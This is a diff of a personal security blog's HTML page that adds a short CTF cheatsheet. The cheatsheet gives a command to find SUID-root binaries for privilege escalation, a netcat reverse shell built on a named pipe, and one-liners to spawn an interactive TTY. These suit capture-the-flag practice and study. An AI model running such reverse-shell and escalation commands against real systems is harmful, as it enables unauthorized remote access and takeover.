@@ -4,7 +4,7 @@
          
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>Master 0xCcC</title>
+        <title>Ctf Memo</title>
         
         <style>
 
@@ -61,9 +61,6 @@
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
  <meta name="generator" content="Hugo 0.54.0" />
         
-        <link href="/index.xml" rel="alternate" type="application/rss&#43;xml" title="Master 0xCcC" />
-        <link href="/index.xml" rel="feed" type="application/rss&#43;xml" title="Master 0xCcC" />
-        
 
         
     </head>
@@ -83,7 +80,7 @@
 
                 <div class="navbar-header">
 
-                    <a class="navbar-brand visible-xs" href="#">Master 0xCcC</a>
+                    <a class="navbar-brand visible-xs" href="#">Ctf Memo</a>
 
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
@@ -128,14 +125,7 @@
 
 <main>
 
-    <div class="intro">
-
-        
-
-        <h3>Last posts</h3>
-        <ul>
-    
-     <div class="item">
+    <div class="item">
 
     
     
@@ -144,64 +134,62 @@
     
     
 
-    <h4><a href="/tools/convert/">Bin/asci/hex/b64 converter</a></h4>
-    <h5>July 27, 2019</h5>
-    
-
-</div>
-  <div class="item">
-
-    
-    
-    
-
-    
-    
-
-    <h4><a href="/memo/ld_preload/">LD_PRELOAD trick</a></h4>
-    <h5>July 27, 2019</h5>
-    
-    <a href="https://masterccc.github.io/tags/elf"><kbd class="item-tag">ELF</kbd></a>
+    <h4><a href="/memo/ctf/">Ctf Memo</a></h4>
+    <h5>August 27, 2019</h5>
     
     <a href="https://masterccc.github.io/tags/linux"><kbd class="item-tag">linux</kbd></a>
     
-    <a href="https://masterccc.github.io/tags/hook"><kbd class="item-tag">hook</kbd></a>
+    <a href="https://masterccc.github.io/tags/privesc"><kbd class="item-tag">privesc</kbd></a>
     
-    <a href="https://masterccc.github.io/tags/instrumentation"><kbd class="item-tag">instrumentation</kbd></a>
-    
-
-</div>
-  <div class="item">
-
-    
-    
-    
-
-    
-    
-
-    <h4><a href="/reverse/cm_thething/">Crackmes.de - The_thing by prout</a></h4>
-    <h5>July 26, 2019</h5>
-    
-    <a href="https://masterccc.github.io/tags/elf"><kbd class="item-tag">ELF</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/crackme"><kbd class="item-tag">crackme</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/assembly"><kbd class="item-tag">assembly</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/keygen"><kbd class="item-tag">keygen</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/challenge"><kbd class="item-tag">challenge</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/linux"><kbd class="item-tag">linux</kbd></a>
+    <a href="https://masterccc.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
     
 
 </div>
- 
 
-		   
 
-    </div>
+    <br> <div class="text-justify">
+
+<h1 id="cheatsheet-ctf">Cheatsheet - CTF</h1>
+
+<h2 id="fin-suid">Fin SUID</h2>
+
+<pre><code>find / -user root -perm -4000 -exec ls -ldb {} \;
+</code></pre>
+
+<h2 id="netcat-without-e">Netcat without -e</h2>
+
+<pre><code>mknod /tmp/bp p 
+/bin/sh 0&lt;/tmp/bp | nc addr port 1&gt;/tmp/bp
+</code></pre>
+
+<p>One-line :</p>
+
+<pre><code>mknod /tmp/bp p ; /bin/sh 0&lt;/tmp/bp | nc addr port 1&gt;/tmp/bp
+</code></pre>
+
+<h2 id="spawn-a-tty">Spawn a TTY</h2>
+
+<h3 id="python">Python</h3>
+
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
+</code></pre>
+
+<h3 id="shell">Shell</h3>
+
+<pre><code>/bin/sh -i
+</code></pre>
+
+<h3 id="other">Other</h3>
+
+<p><a href="https://netsec.ws/?p=337">https://netsec.ws/?p=337</a></p>
+</div>
+
+    
+    
+
+    
+
+    
 
 </main>
 
